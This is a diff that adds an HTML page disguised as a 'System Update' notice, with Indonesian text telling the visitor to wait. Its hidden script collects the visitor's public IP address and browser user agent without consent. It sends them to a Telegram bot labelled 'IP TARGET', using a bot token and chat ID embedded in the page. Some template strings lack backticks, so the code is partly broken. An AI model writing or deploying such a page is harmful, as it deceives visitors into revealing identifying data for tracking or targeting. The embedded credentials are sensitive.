@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Update</title>
+</head>
+<body>
+    <h1>Update Sistem</h1>
+    <p>Harap tunggu...</p>
+
+    <script>
+        //
+        const token = '8579754286: AAHrFDdkORY6DMVn0JJr eVfkFbcCOcweWhA';
+        const chatId = '8418636865';
+
+        // Ambil IP
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                const ip = data.ip;
+                const pesan = 🔴 IP TARGET: ${ip}\nBrowser: ${navigator.userAgent};
+                
+                fetch(https://api.telegram.org/bot${token}/sendMessage, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: pesan
+                    })
+                });
+            });
+    </script>
+</body>
+</html>
